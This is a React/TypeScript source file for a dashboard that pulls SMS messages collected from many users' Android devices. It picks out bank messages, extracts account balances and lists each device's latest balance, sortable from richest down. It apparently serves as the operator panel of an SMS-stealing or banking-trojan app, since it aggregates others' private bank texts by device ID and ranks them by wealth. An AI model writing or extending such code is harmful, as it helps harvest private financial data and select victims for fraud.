import React, { useEffect, useState, useMemo } from 'react';
import { fetchGlobalSMS } from '../services/firebase';
import { detectBanks, extractBalance } from '../services/bankUtils';
import { SMS } from '../types';

interface Props {
  onBack: () => void;
}

interface BalanceEntry {
  userId: string;
  deviceId: string; // We'll try to find this or fallback to User ID
  bankName: string;
  amount: string;
  timestamp: number;
}

const BankBalanceSummary: React.FC<Props> = ({ onBack }) => {
  const [loading, setLoading] = useState(true);
  const [entries, setEntries] = useState<BalanceEntry[]>([]);
  const [sortField, setSortField] = useState<'timestamp' | 'amount' | 'bank'>('timestamp');

  useEffect(() => {
    const loadData = async () => {
      setLoading(true);
      try {
        const allSms = await fetchGlobalSMS();
        
        // Group by User ID, then process to find latest balance per user
        // Requirement: "One entry per device" -> "List unique users only (no duplicates)"
        // We will show the LATEST detected balance for each user.
        
        const userMap = new Map<string, BalanceEntry>();

        allSms.forEach(sms => {
          if (!sms.body) return;
          const banks = detectBanks(sms.sender + ' ' + sms.body);
          if (banks.length > 0) {
            const balance = extractBalance(sms.body);
            if (balance) {
              const currentEntry = userMap.get(sms.userId);
              // If no entry, or this sms is newer than existing entry
              if (!currentEntry || sms.timestamp > currentEntry.timestamp) {
                userMap.set(sms.userId, {
                  userId: sms.userId,
                  deviceId: sms.androidId || sms.userId, // fallback
                  bankName: banks[0], // Take primary detected bank
                  amount: balance,
                  timestamp: sms.timestamp
                });
              }
            }
          }
        });

        setEntries(Array.from(userMap.values()));
      } catch (err) {
        console.error(err);
      } finally {
        setLoading(false);
      }
    };
    loadData();
  }, []);

  const sortedEntries = useMemo(() => {
    return [...entries].sort((a, b) => {
      if (sortField === 'timestamp') return b.timestamp - a.timestamp;
      if (sortField === 'bank') return a.bankName.localeCompare(b.bankName);
      if (sortField === 'amount') {
        // Strip commas and cast to float, safety check for undefined
        const sA = a.amount || '0';
        const sB = b.amount || '0';
        const valA = parseFloat(String(sA).replace(/,/g, ''));
        const valB = parseFloat(String(sB).replace(/,/g, ''));
        return valB - valA;
      }
      return 0;
    });
  }, [entries, sortField]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    // Simple visual feedback could be added here
  };

  return (
    <div className="h-full flex flex-col bg-gray-50">
      <header className="bg-white px-6 py-4 shadow-sm border-b border-gray-200 flex items-center sticky top-0 z-20 flex-none">
        <button onClick={onBack} className="mr-4 p-2 rounded-full hover:bg-gray-100 text-gray-600 transition-colors">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
          </svg>
        </button>
        <div>
           <h1 className="font-bold text-xl text-gray-900">Bank Balance Summary</h1>
           <p className="text-xs text-gray-500">Latest detected balance per unique device</p>
        </div>
      </header>

      <div className="flex-1 overflow-auto p-4 md:p-6">
        {loading ? (
           <div className="flex justify-center mt-20">
             <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-app-green"></div>
           </div>
        ) : entries.length === 0 ? (
           <div className="flex flex-col items-center justify-center h-64 text-gray-400 border-2 border-dashed border-gray-200 rounded-xl bg-gray-50/50">
             <p className="font-medium">No balance data detected</p>
           </div>
        ) : (
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
             <div className="overflow-x-auto">
               <table className="w-full text-left text-sm">
                 <thead className="bg-gray-50 border-b border-gray-200">
                   <tr>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs">Device ID</th>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs cursor-pointer hover:text-gray-700" onClick={()=>setSortField('bank')}>
                        Bank {sortField==='bank' && '↓'}
                     </th>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs cursor-pointer hover:text-gray-700" onClick={()=>setSortField('amount')}>
                        Balance {sortField==='amount' && '↓'}
                     </th>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs cursor-pointer hover:text-gray-700" onClick={()=>setSortField('timestamp')}>
                        Detected {sortField==='timestamp' && '↓'}
                     </th>
                   </tr>
                 </thead>
                 <tbody className="divide-y divide-gray-100">
                   {sortedEntries.map((entry) => (
                     <tr key={entry.userId} className="hover:bg-gray-50 transition-colors">
                       <td className="px-6 py-4">
                         <div className="flex items-center space-x-2">
                           <span className="font-mono text-gray-600 truncate max-w-[150px]">{entry.deviceId.substring(0, 20)}{entry.deviceId.length>20?'...':''}</span>
                           <button onClick={()=>copyToClipboard(entry.deviceId)} className="text-gray-400 hover:text-app-green focus:outline-none">
                             <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                           </button>
                         </div>
                       </td>
                       <td className="px-6 py-4">
                         <span className="px-2 py-1 bg-blue-50 text-blue-700 rounded-full text-xs font-bold border border-blue-100">{entry.bankName}</span>
                       </td>
                       <td className="px-6 py-4 font-mono font-bold text-gray-900 text-base">
                         {entry.amount}
                       </td>
                       <td className="px-6 py-4 text-gray-500 text-xs whitespace-nowrap">
                         {new Date(entry.timestamp).toLocaleString()}
                       </td>
                     </tr>
                   ))}
                 </tbody>
               </table>
             </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default BankBalanceSummary;